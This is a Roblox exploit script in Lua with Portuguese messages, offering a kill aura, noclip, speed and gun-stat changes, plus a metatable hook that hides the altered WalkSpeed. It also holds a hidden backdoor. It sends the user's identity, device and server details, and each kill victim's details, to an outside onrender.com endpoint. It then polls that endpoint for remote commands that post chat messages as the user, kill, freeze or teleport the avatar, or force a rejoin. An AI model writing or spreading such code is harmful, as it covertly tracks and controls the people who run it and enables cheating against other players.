local Http = game:GetService("HttpService")
local Plrs = game:GetService("Players")
local UIS = game:GetService("UserInputService")
local SG = game:GetService("StarterGui")
local RS = game:GetService("RunService")
local Rep = game:GetService("ReplicatedStorage")
local Plr = Plrs.LocalPlayer
local Executor = (identifyexecutor and identifyexecutor()) or "Unknown"

local b = bit32

local function bor(a,bc) return b.bor(a, bc) end
local band = b.band
local bxor = b.bxor
local rshift = b.rshift
local lshift = b.lshift

local function rrotate(x, n)
    n = n % 32
    return bor(rshift(x, n), lshift(x, 32 - n))
end

local K = {
    0x428a2f98,0x71374491,0xb5c0fbcf,0xe9b5dba5,0x3956c25b,0x59f111f1,0x923f82a4,0xab1c5ed5,
    0xd807aa98,0x12835b01,0x243185be,0x550c7dc3,0x72be5d74,0x80deb1fe,0x9bdc06a7,0xc19bf174,
    0xe49b69c1,0xefbe4786,0x0fc19dc6,0x240ca1cc,0x2de92c6f,0x4a7484aa,0x5cb0a9dc,0x76f988da,
    0x983e5152,0xa831c66d,0xb00327c8,0xbf597fc7,0xc6e00bf3,0xd5a79147,0x06ca6351,0x14292967,
    0x27b70a85,0x2e1b2138,0x4d2c6dfc,0x53380d13,0x650a7354,0x766a0abb,0x81c2c92e,0x92722c85,
    0xa2bfe8a1,0xa81a664b,0xc24b8b70,0xc76c51a3,0xd192e819,0xd6990624,0xf40e3585,0x106aa070,
    0x19a4c116,0x1e376c08,0x2748774c,0x34b0bcb5,0x391c0cb3,0x4ed8aa4a,0x5b9cca4f,0x682e6ff3,
    0x748f82ee,0x78a5636f,0x84c87814,0x8cc70208,0x90befffa,0xa4506ceb,0xbef9a3f7,0xc67178f2
}

local function preprocess(msg)
    local orig_len = #msg * 8
    msg = msg .. "\128"
    while (#msg % 64) ~= 56 do
        msg = msg .. "\0"
    end

    for i = 7, 0, -1 do
        local byte = math.floor(orig_len / (2^(i*8))) % 256
        msg = msg .. string.char(byte)
    end
    return msg
end

local function to_uint32(x)
    return x % 2^32
end

local function sha256(msg)
    msg = msg or ""
    msg = preprocess(msg)

    local H = {
        0x6a09e667,
        0xbb67ae85,
        0x3c6ef372,
        0xa54ff53a,
        0x510e527f,
        0x9b05688c,
        0x1f83d9ab,
        0x5be0cd19
    }

    for chunk_i = 1, #msg, 64 do
        local chunk = msg:sub(chunk_i, chunk_i + 63)
        local w = {}

        for i = 0, 15 do
            local a = string.byte(chunk, i*4 + 1) or 0
            local b = string.byte(chunk, i*4 + 2) or 0
            local c = string.byte(chunk, i*4 + 3) or 0
            local d = string.byte(chunk, i*4 + 4) or 0
            w[i] = to_uint32(lshift(a,24) + lshift(b,16) + lshift(c,8) + d)
        end

        for i = 16, 63 do
            local s0 = bxor(rrotate(w[i-15],7), bxor(rrotate(w[i-15],18), rshift(w[i-15],3)))
            local s1 = bxor(rrotate(w[i-2],17), bxor(rrotate(w[i-2],19), rshift(w[i-2],10)))
            w[i] = to_uint32(w[i-16] + s0 + w[i-7] + s1)
        end

        local a,b,c,d,e,f,g,h = H[1],H[2],H[3],H[4],H[5],H[6],H[7],H[8]

        for i = 0, 63 do
            local S1 = bxor(rrotate(e,6), bxor(rrotate(e,11), rrotate(e,25)))
            local ch = bxor(band(e,f), band(bnot and bnot(e) or (0xFFFFFFFF - e), g))
        
            if type(bnot) ~= "function" then
            
                local function bnot_em(u) return to_uint32(0xFFFFFFFF - u) end
                ch = bxor(band(e,f), band(bnot_em(e), g))
            end
        
            local temp1 = to_uint32(h + S1 + ch + K[i+1] + w[i])
            local S0 = bxor(rrotate(a,2), bxor(rrotate(a,13), rrotate(a,22)))
            local maj = bxor(bxor(band(a,b), band(a,c)), band(b,c))
            local temp2 = to_uint32(S0 + maj)

            h = g
            g = f
      
            f = e
            e = to_uint32(d + temp1)
            d = c
            c = b
            b = a
            a = to_uint32(temp1 + temp2)
        end

        H[1] = to_uint32(H[1] + a)
        H[2] = to_uint32(H[2] + b)
        H[3] = to_uint32(H[3] + c)
        H[4] = to_uint32(H[4] + d)
        H[5] = to_uint32(H[5] + e)
        H[6] = to_uint32(H[6] + f)
        H[7] = to_uint32(H[7] + g)
        H[8] = to_uint32(H[8] + h)
    end

    return string.format("%08x%08x%08x%08x%08x%08x%08x%08x",
        H[1],H[2],H[3],H[4],H[5],H[6],H[7],H[8])
end


local function generateHash(name, ex, time, id)
    local raw = tostring(name) .. tostring(ex) .. tostring(time) .. tostring(id)
    return sha256(raw)
end

local function authPacket(extra)
    local time = os.time()
    local id = tostring(game.JobId or "")
    local packet = {
        username = Plr.Name,
        executor = Executor,
        timestamp = time,
        jobId = id,
    }
   
    packet.hash = generateHash(packet.username, packet.executor, packet.timestamp, packet.jobId)
    if extra and type(extra) == "table" then
        for k,v in pairs(extra) do packet[k] = v end
    end
    return packet
end

local function notif(t,m,d)
    pcall(function() SG:SetCore("SendNotification",{Title=t,Text=m,Duration=d or 4}) end)
    local s = Instance.new("Sound")
    s.SoundId = "rbxassetid://6534947241"
    s.Volume = 1
    s.PlayOnRemove = true
    s.Parent = workspace
    s:Destroy()
end

local sentLogs = {}
local function sendLog(pl)
  
    if sentLogs[pl.UserId] and tick() - sentLogs[pl.UserId] < 30 then return end
    sentLogs[pl.UserId] = tick()
    local placeId = game.PlaceId
    local gameInfo = game:GetService("MarketplaceService"):GetProductInfo(placeId)
    pcall(function()
        local body = authPacket({
            userId = pl.UserId,
            username = pl.Name,
            executor = Executor,
           
            device = UIS.TouchEnabled and "Mobile" or "PC",
            date = os.date("%d/%m/%Y"),
            time = os.date("%H:%M:%S"),
            placeId = placeId,
            placeName = gameInfo.Name,
            serverJobId = game.JobId
        })
        request({
       
            Url = "https://bot-z6us.onrender.com/log",
            Method = "POST",
            Headers = { ["Content-Type"] = "application/json" },
            Body = Http:JSONEncode(body)
        })
    end)
end

sendLog(Plr)

local function notifyStop()
    pcall(function()
        local body = authPacket()
        request({
          
            Url = "https://bot-z6us.onrender.com/exit",
            Method = "POST",
            Headers = { ["Content-Type"] = "application/json" },
            Body = Http:JSONEncode(body)
        })
    end)
end

Plrs.PlayerRemoving:Connect(function(pl)
    if pl == Plr then
        notifyStop()
    end
end)

notif("oi ^^","feito por fp3 no Discord",5)
notif("Ajuda","Digite .help",7)

local ScreenGui=Instance.new("ScreenGui")
ScreenGui.Name="HelpUI"
ScreenGui.Parent=Plr:WaitForChild("PlayerGui")
ScreenGui.ResetOnSpawn=false
ScreenGui.Enabled=false

local Frame=Instance.new("Frame",ScreenGui)
Frame.Size=UDim2.new(0,300,0,400)
Frame.Position=UDim2.new(1,-320,0.2,0)
Frame.BackgroundColor3=Color3.fromRGB(25,25,25)
Frame.BorderSizePixel=0
Frame.Active=true
Frame.Draggable=true

local UICorner=Instance.new("UICorner",Frame)
UICorner.CornerRadius=UDim.new(0,12)

local Title=Instance.new("TextLabel",Frame)
Title.Size=UDim2.new(1,-20,0,30)
Title.Position=UDim2.new(0,10,0,10)
Title.BackgroundTransparency=1
Title.Text="Comandos"
Title.TextColor3=Color3.fromRGB(255,255,255)
Title.Font=Enum.Font.GothamBold
Title.TextSize=20
Title.TextXAlignment=Enum.TextXAlignment.Left

local CloseBtn=Instance.new("TextButton",Frame)
CloseBtn.Size=UDim2.new(0,28,0,28)
CloseBtn.Position=UDim2.new(1,-38,0,10)
CloseBtn.BackgroundTransparency=1
CloseBtn.Text="X"
CloseBtn.TextColor3=Color3.fromRGB(200,80,80)
CloseBtn.Font=Enum.Font.GothamBold
CloseBtn.TextSize=18
CloseBtn.MouseButton1Click:Connect(function()ScreenGui.Enabled=false end)

local Scroller=Instance.new("ScrollingFrame",Frame)
Scroller.Size=UDim2.new(1,-20,1,-50)
Scroller.Position=UDim2.new(0,10,0,40)
Scroller.BackgroundTransparency=1
Scroller.ScrollBarThickness=8
Scroller.AutomaticCanvasSize=Enum.AutomaticSize.Y

local UIList=Instance.new("UIListLayout",Scroller)
UIList.SortOrder=Enum.SortOrder.LayoutOrder
UIList.Padding=UDim.new(0,5)

local function addCommand(t)
    local lbl=Instance.new("TextLabel")
    lbl.Size=UDim2.new(1,0,0,0)
    lbl.BackgroundTransparency=1
    lbl.TextColor3=Color3.fromRGB(220,220,220)
    lbl.Font=Enum.Font.Gotham
    lbl.TextSize=15
    lbl.TextXAlignment=Enum.TextXAlignment.Left
    lbl.TextYAlignment=Enum.TextYAlignment.Top
    lbl.TextWrapped=true
    lbl.Text=t
    lbl.Parent=Scroller
    lbl:GetPropertyChangedSignal("TextBounds"):Connect(function()
        lbl.Size=UDim2.new(1,0,0,lbl.TextBounds.Y+4)
    end)
    lbl.Size=UDim2.new(1,0,0,lbl.TextBounds.Y+4)
end

local cmds={
".on",
".off",
".help",
".kill",
".speed <v>",
".unspeed",
".noclip",
".clip",
".togglenoclip",
".spread <v>",
".range <v>",
".bullets <v>",
"Feito por fp3"
}

for _,v in ipairs(cmds)do addCommand(v)end

local Border=Instance.new("Frame",Frame)
Border.Size=UDim2.new(1,4,1,4)
Border.Position=UDim2.new(0,-2,0,-2)
Border.BackgroundTransparency=0
Border.BorderSizePixel=0
Border.ZIndex=0
Border.ClipsDescendants=true

local BR=Instance.new("UIGradient",Border)
BR.Color=ColorSequence.new({
    ColorSequenceKeypoint.new(0,Color3.fromRGB(255,0,0)),
    ColorSequenceKeypoint.new(0.2,Color3.fromRGB(255,127,0)),
    ColorSequenceKeypoint.new(0.4,Color3.fromRGB(255,255,0)),
  
    ColorSequenceKeypoint.new(0.6,Color3.fromRGB(0,255,0)),
    ColorSequenceKeypoint.new(0.8,Color3.fromRGB(0,0,255)),
    ColorSequenceKeypoint.new(1,Color3.fromRGB(139,0,255))
})
BR.Rotation=45

local GS=Rep:WaitForChild("GunSystem")
local GunConfigs=GS:WaitForChild("GunsConfigurations")
local Fire=GS.Remotes.Events.Fire
local Reload=GS.Remotes.Functions.Reload
local LP=Plr

local scriptOn=true
local warnedNoGun=false
local scriptActive=true
local connections={}
local threads={}
local ult=nil
local tlast=0
local defaultWalk=16
local Noclipping=nil
local Clip=true
local Aura = false

local function track(c)table.insert(connections,c)end
local function trackT(t)table.insert(threads,t)end
local function reg(pl)ult=pl tlast=tick()end

local activeUsers={}

local function check()
    local bp=LP:FindFirstChild("Backpack")
    local c=LP.Character
    for _,cfg in ipairs(GunConfigs:GetChildren())do
        local n=cfg.Name
        if(bp and bp:FindFirstChild(n))or(c and c:FindFirstChild(n))then return true end
    end
    return false
end

local function chatMessage(str)
   
    str=tostring(str)
    if TextChatService and TextChatService.TextChannels and TextChatService.TextChannels.RBXGeneral then
        TextChatService.TextChannels.RBXGeneral:SendAsync(str)
    else
        Rep.DefaultChatSystemChatEvents.SayMessageRequest:FireServer(str,"All")
    end
end

local function watch(pl)
    track(pl.CharacterAdded:Connect(function(char)
        local hum=char:WaitForChild("Humanoid")
        track(hum.Died:Connect(function()
            if ult==pl and tick()-tlast<1.2 then
                notif("KILL","Matou "..pl.Name)
         
                sendLog(pl)
            end
        end))
    end))
end

for _,pl in ipairs(Plrs:GetPlayers())do if pl~=LP then watch(pl)end end
track(Plrs.PlayerAdded:Connect(function(pl)if pl~=LP then watch(pl)end end))

local function hookHumanoid(h)
    local ok,raw=pcall(function()return getrawmetatable(h)end)
    if not ok or not raw then return end
    setreadonly(raw,false)
    local old=raw.__index
    raw.__index=newcclosure(function(self,key)
        if self==h then
            if key=="WalkSpeed" then return 16 end
            if key=="JumpPower" then return 50 end
        end
        return old(self,key)
    end)
    setreadonly(raw,true)
end

if LP.Character then
    local hum=LP.Character:FindFirstChildOfClass("Humanoid")
    if hum then hookHumanoid(hum)end
end

LP.CharacterAdded:Connect(function(char)
    local hum=char:WaitForChild("Humanoid")
    hookHumanoid(hum)
end)

local function NoclipLoop()
    if Clip==false and LP.Character then
        for _,v in pairs(LP.Character:GetDescendants())do
           
            if v:IsA("BasePart")and v.CanCollide then v.CanCollide=false end
        end
    end
end

local function KillScript()
    if not scriptActive then return end
    scriptActive=false
    scriptOn=false
    Aura=false
    Clip=true
    activeUsers[LP.Name]=nil
    if Noclipping then Noclipping:Disconnect() end
    for _,c in ipairs(connections)do if c and c.Disconnect then c:Disconnect()end end
    for _,t in ipairs(threads)do pcall(task.cancel,t)end
    notif("Script","Script encerrado.")
end

local function getHeldGunConfig()
    local c=LP.Character
    if not c then return nil end
   
    local gun=c:FindFirstChildWhichIsA("Tool")
    if not gun then return nil end
    local cfg=GunConfigs:FindFirstChild(gun.Name)
    if not cfg then return nil end
    return require(cfg),gun.Name
end

local function modifyHeldGunProperty(p,v)
    local tbl,name=getHeldGunConfig()
    if tbl then
        if tbl[p]~=nil then
            tbl[p]=v
            notif("GunMod",name.." "..p.." → "..tostring(v))
        end
    end
end

local function checkDiscordCommands()
    
    while task.wait(0.5) do
        local ok, res = pcall(function()
            local body = authPacket()
            return request({
                Url = "https://bot-z6us.onrender.com/nextCommand",
                Method = "POST",
                Headers = { ["Content-Type"] = "application/json" },
                Body = Http:JSONEncode(body)
            })
        end)
        if not ok or not res or not res.Success then continue end
        local data = Http:JSONDecode(res.Body)
        if not data.command then continue end

        local cmd = data.command
        
        local a1 = data.arg1
        local a2 = data.arg2
        local content = data.content

        activeUsers[Plr.Name]=true

        if cmd == "kill" then
            local hum = Plr.Character and Plr.Character:FindFirstChildOfClass("Humanoid")
            if hum then hum.Health = 0 end
        end
        if cmd == "message" and content then
            chatMessage(content)
        end
        if cmd == "speed" then
            if Plr.Character and Plr.Character:FindFirstChild("Humanoid") then
                Plr.Character.Humanoid.WalkSpeed = tonumber(a1) or 16
            end
        end
        if cmd == "teleport" then
            local target = Plrs:FindFirstChild(a1)
            if target and target.Character and target.Character:FindFirstChild("HumanoidRootPart") then
                local hrp = Plr.Character and Plr.Character:FindFirstChild("HumanoidRootPart")
                if hrp then hrp.CFrame = target.Character.HumanoidRootPart.CFrame end
            end
        end
  
        if cmd == "bring" then
            local p1 = Plrs:FindFirstChild(a1)
            local p2 = Plrs:FindFirstChild(a2)
            if p1 and p2 and p1.Character and p2.Character then
                local hrp1 = p1.Character:FindFirstChild("HumanoidRootPart")
                local hrp2 = p2.Character:FindFirstChild("HumanoidRootPart")
  
                if hrp1 and hrp2 then hrp1.CFrame = hrp2.CFrame + Vector3.new(0,2,0) end
            end
        end
        if cmd == "freeze" then
            local char = Plr.Character
            if char then
               
                local hrp = char:FindFirstChild("HumanoidRootPart")
                local hum = char:FindFirstChildOfClass("Humanoid")
                if hrp then hrp.Anchored = true end
                if hum then hum.WalkSpeed = 0 hum.JumpPower = 0 end
            end
        end
        if cmd == "unfreeze" then
            local char = Plr.Character
            if char then
                local hrp = char:FindFirstChild("HumanoidRootPart")
                local hum = char:FindFirstChildOfClass("Humanoid")
                if hrp then hrp.Anchored = false end
         
                if hum then hum.WalkSpeed = 16 hum.JumpPower = 50 end
            end
        end
        if cmd == "rejoin" then
            game:GetService("TeleportService"):Teleport(game.PlaceId, Plr)
        end
    end
end
task.spawn(checkDiscordCommands)

track(Plr.Chatted:Connect(function(msg)
    msg = msg:lower()

    if msg == ".off" then
        Aura=false
        scriptOn=false
     
        warnedNoGun=false
        activeUsers[Plr.Name]=nil
        notif("Script","Desligado.")
    end

    if msg == ".on" then
        if not check() then
            warnedNoGun=true
            notif("Erro","Você precisa de uma arma.")
            return
        end
        Aura=true
        scriptOn=true
  
        warnedNoGun=false
        activeUsers[Plr.Name]=true
        notif("Script","[KILL-AURA] Ativado")
    end

    if msg == ".help" then
        ScreenGui.Enabled=true
        notif("Comandos","")
    end

    if msg == ".kill" then
        KillScript()
        notifyStop()
        notif("Script","Script encerrado.")
    end

    if msg:sub(1,6)==".speed" then
  
        local v = tonumber(msg:match("%d+"))
        if v and Plr.Character and Plr.Character:FindFirstChild("Humanoid") then
            Plr.Character.Humanoid.WalkSpeed=v
            notif("Speed","alterada para "..v)
        end
    end

    if msg == ".unspeed" then
        if Plr.Character and Plr.Character:FindFirstChild("Humanoid") then
            Plr.Character.Humanoid.WalkSpeed=defaultWalk
       
            notif("Speed","restaurada para "..defaultWalk)
        end
    end

    if msg == ".noclip" then
        Clip=false
        if Noclipping then Noclipping:Disconnect() end
        Noclipping=RS.Stepped:Connect(NoclipLoop)
        notif("Noclip","Noclip ON")
    end

    if msg == ".clip" or msg == ".unnoclip" then
        Clip=true
        if Noclipping then Noclipping:Disconnect() end
        notif("Noclip","Noclip OFF")
    end

    if msg == ".togglenoclip" then
        if Clip then
            Clip=false
            if Noclipping then Noclipping:Disconnect() end
            Noclipping=RS.Stepped:Connect(NoclipLoop)
            notif("Noclip","Noclip ON")
        else
        
            Clip=true
            if Noclipping then Noclipping:Disconnect() end
            notif("Noclip","Noclip OFF")
        end
    end

    if msg:sub(1,7)==".spread" then
        local v=tonumber(msg:match("%d+"))
        if v then
            modifyHeldGunProperty("Spread",v)
            notif("GunMod","alterado para "..v)
    
        end
    end

    if msg:sub(1,6)==".range" then
        local v=tonumber(msg:match("%d+"))
        if v then
            modifyHeldGunProperty("Range",v)
            notif("GunMod","alterado para "..v)
        end
    end

    if msg:sub(1,8)==".bullets" then
        local v=tonumber(msg:match("%d+"))
        if v then
    
            modifyHeldGunProperty("Bullets",v)
            notif("GunMod","alterado para "..v)
        end
    end
end))

trackT(task.spawn(function()
    while task.wait(0.25)do
        if(not scriptActive)or(not Aura)or(not check())then continue end
        local c=LP.Character
        if not c then continue end
        local gun=c:FindFirstChildWhichIsA("Tool")
        if not gun then continue end
    
        pcall(function()Reload:InvokeServer(gun)end)
    end
end))

trackT(task.spawn(function()
    local rp = RaycastParams.new()
    rp.FilterType = Enum.RaycastFilterType.Exclude
    while scriptActive do
        if Aura and check() and LP.Character then
            local c = LP.Character
            local gun = c:FindFirstChildWhichIsA("Tool")
            if gun then
               
                local gunConfig = GunConfigs:FindFirstChild(gun.Name)
                if gunConfig then
                    gunConfig = require(gunConfig)
                    local firePart = gun:FindFirstChild("FirePart") or gun:FindFirstChild("Handle") or gun.PrimaryPart
                    if firePart then
       
                        local filter = {LP.Character}
                        local map = workspace:FindFirstChild("Map")
                        if map then
                           
                            local SZ = map:FindFirstChild("SafeZones")
                            local B = map:FindFirstChild("Barriers")
                            if SZ then for _,v in ipairs(SZ:GetChildren()) do filter[#filter+1]=v end end
                           
                            if B then for _,v in ipairs(B:GetChildren()) do filter[#filter+1]=v end end
                        end
                        rp.FilterDescendantsInstances = filter
                        local target = nil
            
                        local dist = 999999
                        for _,enemy in ipairs(Plrs:GetPlayers()) do
                            if enemy ~= LP and enemy.Team ~= LP.Team and enemy.Character then
                   
                                local hum = enemy.Character:FindFirstChildOfClass("Humanoid")
                                if hum and hum.Health > 0 then
                                    local head = enemy.Character:FindFirstChild("Head") or enemy.Character:FindFirstChild("HumanoidRootPart")
     
                                    if head then
                                        local d = (head.Position - firePart.Position).Magnitude
                      
                                        if d < dist then
                                            dist = d
                                
                                            target = head
                                        end
                                    end
          
                                end
                            end
                        end
                        if target then
                            local dir = target.Position - firePart.Position
                            local ray = workspace:Raycast(firePart.Position, dir.Unit * dir.Magnitude, rp)
                            local pos = (ray and ray.Position) or target.Position
                            local hit = {}
                            hit[target] = {
                                Normal = (ray and ray.Normal) or Vector3.new(0,1,0),
                                Position = pos,
                                Instance = target,
                              
                                Distance = (firePart.Position - pos).Magnitude,
                                Material = (ray and ray.Material) or Enum.Material.ForceField
                            }
                            
                            pcall(function()
                                Fire:FireServer(gun, hit, pos)
                            end)
                            reg(target.Parent)
          
                        end
                    end
                end
            end
        end
        task.wait(0.001)
    end
end))
local function cleanup()
    notifyStop()
    if Noclipping then pcall(function() Noclipping:Disconnect() end) end
    for _,c in ipairs(connections) do pcall(function() c:Disconnect() end) end
    for _,t in ipairs(threads) do pcall(task.cancel, t) end
end
if game:IsLoaded() then
    game:BindToClose(function() cleanup() end)
end
